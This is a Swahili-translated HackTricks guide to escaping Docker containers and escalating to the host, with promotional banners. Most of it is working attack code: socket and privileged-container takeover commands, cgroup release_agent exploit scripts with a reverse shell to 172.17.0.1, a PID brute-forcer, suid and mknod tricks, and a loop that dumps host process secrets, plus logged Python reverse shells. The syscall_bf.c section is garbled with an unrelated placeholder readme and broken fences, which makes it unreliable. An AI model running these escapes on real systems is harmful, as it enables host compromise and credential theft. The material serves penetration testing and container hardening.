# Kuvuja kwa Docker / Kuongezeka kwa Mamlaka

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za jamii **za juu zaidi** ulimwenguni.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## Uchunguzi na Kutoroka Kiotomatiki

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Inaweza pia **kuchunguza kontena**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Zana hii ni muhimu sana **kuchunguza kontena uliomo hata jaribu kutoroka kiotomatiki**
* [**amicontained**](https://github.com/genuinetools/amicontained): Zana muhimu kupata mamlaka ambazo kontena ina ili kupata njia za kutoroka kutoka kwake
* [**deepce**](https://github.com/stealthcopter/deepce): Zana ya kuchunguza na kutoroka kutoka kwa kontena
* [**grype**](https://github.com/anchore/grype): Pata CVE zilizomo kwenye programu iliyosanikishwa kwenye picha

## Kutoroka kwa Socket ya Docker Iliyosanikishwa

Ikiwa kwa njia fulani unagundua kuwa **socket ya docker imesanikishwa** ndani ya kontena ya docker, utaweza kutoroka kutoka kwake.\
Hii kawaida hutokea kwenye kontena za docker ambazo kwa sababu fulani zinahitaji kuunganisha kwenye daemini ya docker kutekeleza vitendo.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Katika kesi hii unaweza kutumia amri za kawaida za docker kuwasiliana na docker daemon:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
Ikiwa **socket ya docker iko mahali usiotarajiwa** bado unaweza kuwasiliana nayo kutumia amri ya **`docker`** na parameter **`-H unix:///path/to/docker.sock`**
{% endhint %}

Daemon ya Docker inaweza pia [kusikiliza kwenye bandari (kwa chaguo-msingi 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) au kwenye mifumo inayotegemea Systemd, mawasiliano na Daemon ya Docker inaweza kutokea kupitia soketi ya Systemd `fd://`.

{% hint style="info" %}
Kwa kuongezea, weka tahadhari kwa soketi za uendeshaji wa kiwango cha juu za uendeshaji zifuatazo:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Kutoruhusu Uwezo wa Kutoroka

Unapaswa kuangalia uwezo wa kontena, ikiwa ina mojawapo ya yafuatayo, unaweza kutoroka kutoka kwake: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Unaweza kuangalia uwezo wa sasa wa kontena kwa kutumia **zana za moja kwa moja zilizotajwa hapo awali** au:
```bash
capsh --print
```
Katika ukurasa ufuatao unaweza **kujifunza zaidi kuhusu uwezo wa linux** na jinsi ya kuvunja matumizi yao kutoroka/kupandisha vyeo:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Kutoroka kutoka kwenye Kontena yenye Mamlaka

Kontena yenye mamlaka inaweza kuundwa kwa bendera `--privileged` au kwa kulegeza ulinzi maalum:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Bendera ya `--privileged` inapunguza sana usalama wa kontena, ikitoa **upatikanaji usiozuiliwa wa kifaa** na kukiuka **ulinzi kadhaa**. Kwa maelezo zaidi, tazama nyaraka kuhusu athari kamili za `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privileged + hostPID

Kwa ruhusa hizi unaweza tu **kwenda kwenye angahewa ya mchakato unaoendesha kwenye mwenyeji kama root** kama init (pid:1) kwa kutekeleza: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Jaribu katika kontena kwa kutekeleza:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Wenye Haki

Kwa bendera ya wenye haki unaweza kujaribu **kupata diski ya mwenyeji** au kujaribu **kutoroka kwa kutumia release\_agent au njia nyingine za kutoroka**.

Jaribu kufanya upitishaji wa kisasa katika chombo kinachotekelezwa:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Kufunga Diski - Poc1

Vyombo vya docker vilivyo configure vizuri havitaruhusu amri kama **fdisk -l**. Hata hivyo, kwenye amri ya docker iliyopangwa vibaya ambapo bendera `--privileged` au `--device=/dev/sda1` na herufi kubwa imetajwa, ni rahisi kupata mamlaka ya kuona diski ya mwenyeji.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Kwa hivyo, kuchukua udhibiti wa mashine ya mwenyeji ni rahisi:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Na voilà! Sasa unaweza kupata ufikiaji wa mfumo wa faili wa mwenyeji kwa sababu umefungwa kwenye folda ya `/mnt/hola`.

#### Kufunga Diski - Poc2

Ndani ya kontena, mshambuliaji anaweza kujaribu kupata ufikiaji zaidi kwa mfumo wa OS wa mwenyeji kupitia kiasi cha mwenyeji kinachoweza kuandikwa kilichoundwa na kikundi. Hapa chini kuna vitu vya kawaida unavyoweza kuchunguza ndani ya kontena ili uone ikiwa unaweza kutumia vector huu wa mshambuliaji:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Kutoroka kwa Haki kwa Kutumia release\_agent iliyopo ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="PoC ya Awali" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Kutoroka kwa haki kwa kutumia release\_agent iliyoundwa ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Pili PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Pata **maelezo ya mbinu** katika:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Kutoroka kwa Haki Kwa Kutumia release\_agent bila kujua njia ya kihusishi - PoC3

Katika mbinu za awali **njia kamili ya kontena ndani ya mfumo wa mwenyeji inafichuliwa**. Walakini, hii sio kila wakati hali. Katika hali ambapo **haujui njia kamili ya kontena ndani ya mwenyeji** unaweza kutumia mbinu hii:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Kutekeleza PoC ndani ya chombo kilichopewa mamlaka kunapaswa kutoa matokeo kama:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Kutoroka kwa Kibali Kwa Kutumia Vipimo Vyenye Hisia

Kuna faili kadhaa ambazo zinaweza kufungwa ambazo hutoa **taarifa kuhusu mwenyeji wa chini**. Baadhi yao hata yanaweza kuashiria **kitu cha kutekelezwa na mwenyeji wakati kitu kinatokea** (ambacho kitamruhusu mshambuliaji kutoroka kutoka kwa chombo).\
Matumizi mabaya ya faili hizi yanaweza kuruhusu:

* release\_agent (tayari imefunuliwa hapo awali)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Hata hivyo, unaweza kupata **faili nyingine nyeti** za kuangalia kwenye ukurasa huu:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Vipimo Visivyo na Mipaka

Katika matukio kadhaa utagundua kwamba **chombo kina kiasi fulani kilichofungwa kutoka kwa mwenyeji**. Ikiwa kiasi hiki hakijasakinishwa kwa usahihi unaweza kuwa na uwezo wa **kufikia/kubadilisha data nyeti**: Kusoma siri, kubadilisha ssh authorized\_keys...
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Kupandisha Mamlaka kwa Kutumia 2 makombora na kufunga mwenyeji

Ikiwa una ufikiaji kama **root ndani ya chombo** ambacho kina folda fulani kutoka kwa mwenyeji imewekwa na umetoka kama mtumiaji asiye na mamlaka kwa mwenyeji na una ufikiaji wa kusoma kwenye folda iliyowekwa.\
Unaweza kuunda faili ya **bash suid** kwenye **folda iliyowekwa** ndani ya **chombo** na **kuitekeleza kutoka kwa mwenyeji** ili kupandisha mamlaka.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Upandishaji wa Mamlaka na mabano 2

Ikiwa una ufikiaji kama **root ndani ya chombo** na umetoka kama mtumiaji asiye na mamlaka kwenye mwenyeji, unaweza kutumia mabano yote mawili kufanya **upandishaji wa mamlaka ndani ya mwenyeji** ikiwa una uwezo wa MKNOD ndani ya chombo (kwa chaguo-msingi) kama [**inavyoelezwa katika chapisho hili**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Kwa uwezo kama huo, mtumiaji wa root ndani ya chombo ameruhusiwa kuunda **faili za kifaa cha kuzuia**. Faili za kifaa ni faili maalum zinazotumiwa kwa **kufikia vifaa vya chini & moduli za kernel**. Kwa mfano, faili ya kifaa cha kuzuia /dev/sda inatoa ufikiaji wa **kusoma data ghafi kwenye diski za mifumo**.

Docker inalinda dhidi ya matumizi mabaya ya vifaa vya kuzuia ndani ya vyombo kwa kutekeleza sera ya cgroup ambayo **inazuia operesheni za kusoma/kusika kwenye vifaa vya kuzuia**. Walakini, ikiwa kifaa cha kuzuia **kinachoundwa ndani ya chombo**, kinakuwa kinapatikana kutoka nje ya chombo kupitia saraka ya **/proc/PID/root/**. Upatikanaji huu unahitaji **mmiliki wa mchakato awe sawa** ndani na nje ya chombo.

Mfano wa **Udanganyifu** kutoka kwenye [**makala hii**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Ikiwa unaweza kupata michakato ya mwenyeji utaweza kupata habari nyeti iliyohifadhiwa katika michakato hiyo. Tekeleza mtihani wa maabara:
```
docker run --rm -it --pid=host ubuntu bash
```
Kwa mfano, utaweza kuorodhesha michakato inayotumia kitu kama `ps auxn` na kutafuta maelezo nyeti katika amri.

Kisha, kama unaweza **kufikia kila mchakato wa mwenyeji katika /proc/, unaweza tu kuiba siri zao za mazingira** kwa kukimbia:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Unaweza pia **kufikia maelezo ya faili ya michakato mingine na kusoma faili zao zilizofunguliwa**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Unaweza pia **kuua michakato na kusababisha DoS**.

{% hint style="warning" %}
Ikiwa kwa njia fulani una **upatikanaji wa mamlaka juu ya mchakato nje ya chombo**, unaweza kukimbia kitu kama `nsenter --target <pid> --all` au `nsenter --target <pid> --mount --net --pid --cgroup` **kukimbia kabia na vikwazo sawa vya ns** (kwa matumaini hakuna) **kama mchakato huo.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Ikiwa chombo kilikonfigurwa na Dereva wa Uunganisho wa Mwenyeji wa Docker (`--network=host`), mtandao wa chombo hicho haujaachwa peke yake kutoka kwa mwenyeji wa Docker (chombo hushiriki uga wa mtandao wa mwenyeji), na chombo hicho hakipati anwani yake ya IP yenyewe. Kwa maneno mengine, **chombo hufunga huduma zote moja kwa moja kwa anwani ya IP ya mwenyeji**. Zaidi ya hayo, chombo hicho kinaweza **kukamata TRAFIKI YOTE ya mtandao ambayo mwenyeji** anatuma na kupokea kwenye kiolesura kilichoshirikiwa `tcpdump -i eth0`.

Kwa mfano, unaweza kutumia hii kwa **kukamata na hata kughushi trafiki** kati ya mwenyeji na kielelezo cha metadata.

Kama katika mifano ifuatayo:

* [Maelezo: Jinsi ya kuwasiliana na Google SRE: Kudondosha kabibi katika SQL ya wingu](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [HUDUMA YA METADATA MITM inaruhusu ukuaji wa mamlaka ya msingi (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Pia utaweza kupata **huduma za mtandao zilizofungwa kwa localhost** ndani ya mwenyeji au hata kupata **ruhusa za metadata ya node** (ambazo zinaweza kutofautiana na zile ambazo chombo kinaweza kupata).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Kwa `hostIPC=true`, unapata ufikio wa rasilimali za mawasiliano kati ya michakato (IPC) ya mwenyeji, kama vile **kumbukumbu iliyoshirikishwa** katika `/dev/shm`. Hii inaruhusu kusoma/kutumia mahali ambapo rasilimali sawa za IPC hutumiwa na michakato mingine ya mwenyeji au podi. Tumia `ipcs` kupekua mbinu hizi za IPC zaidi.

* **Pima /dev/shm** - Tafuta faili yoyote katika eneo hili la kumbukumbu iliyoshirikishwa: `ls -la /dev/shm`
* **Pima vifaa vya IPC vilivyopo** - Unaweza kuangalia kuona ikiwa vifaa vyovyote vya IPC vinatumika kwa kutumia `/usr/bin/ipcs`. Angalia hivi: `ipcs -a`

### Rudisha uwezo

Ikiwa syscall **`unshare`** haijazuiliwa unaweza kurejesha uwezo wote kwa kukimbia:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Mabaya ya eneo la mtumiaji kupitia symlink

Mbinu ya pili iliyoelezwa katika chapisho [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) inaonyesha jinsi unavyoweza kutumia bind mounts na user namespaces, kuathiri faili ndani ya mwenyeji (katika kesi hiyo maalum, kufuta faili).

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii ya juu zaidi duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVEs

### Runc exploit (CVE-2019-5736)

Kwa kesi unaweza kutekeleza `docker exec` kama root (labda kwa sudo), jaribu kuinua mamlaka kwa kutoroka kutoka kwa chombo kwa kutumia CVE-2019-5736 (kutumia [hapa](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Mbinu hii kimsingi ita **badilisha** _**/bin/sh**_ binary ya **mwenyeji** **kutoka kwa chombo**, hivyo yeyote anayetekeleza docker exec anaweza kuzindua payload.

Badilisha payload kulingana na hilo na jenga main.go kwa `go build main.go`. Binary inayopatikana inapaswa kuwekwa kwenye chombo cha docker kwa utekelezaji.\
Baada ya utekelezaji, mara tu inapoonyesha `[+] Imebadilishwa /bin/sh kwa mafanikio` unahitaji kutekeleza yafuatayo kutoka kwa mashine ya mwenyeji:

`docker exec -it <jina-la-chombo> /bin/sh`

Hii itazindua payload iliyopo kwenye faili ya main.go.

Kwa habari zaidi: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Kuna CVEs nyingine ambazo chombo kinaweza kuwa hatarini, unaweza kupata orodha katika [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Kutoroka Kwa Kubinafsisha Kwa Docker

### Eneo la Kutoroka la Docker

* **Namespaces:** Mchakato unapaswa kuwa **umejitenga kabisa na michakato mingine** kupitia namespaces, hivyo hatuwezi kutoroka kuingiliana na michakato mingine kutokana na namespaces (kwa chaguo-msingi hawezi kuwasiliana kupitia IPCs, soketi za unix, huduma za mtandao, D-Bus, `/proc` ya michakato mingine).
* **Mtumiaji wa Root**: Kwa chaguo-msingi mtumiaji anayetekeleza mchakato ni mtumiaji wa root (hata hivyo mamlaka yake ni mdogo).
* **Uwezo**: Docker inaacha uwezo ufuatao: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Syscalls**: Hizi ni syscalls ambazo **mtumiaji wa root hataweza kuita** (kutokana na kukosa uwezo + Seccomp). Syscalls nyingine zinaweza kutumika kujaribu kutoroka.

{% tabs %}
{% tab title="x64 syscalls" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="wito wa arm64" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %} 

### Docker Breakout Privilege Escalation

#### Description

This repository contains a proof of concept exploit for Docker breakout privilege escalation. The exploit takes advantage of a misconfigured Docker container to gain root access on the host machine.

#### Usage

Compile the `syscall_bf.c` code on the host machine using the provided Makefile. Run the compiled binary inside a Docker container to escalate privileges and gain root access.

#### Disclaimer

This exploit is for educational purposes only. Misuse of this exploit on unauthorized systems is illegal.

#### Credits

This exploit was created by [Author Name]. 

#### Reference

- [Link to original article](https://example.com)

{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
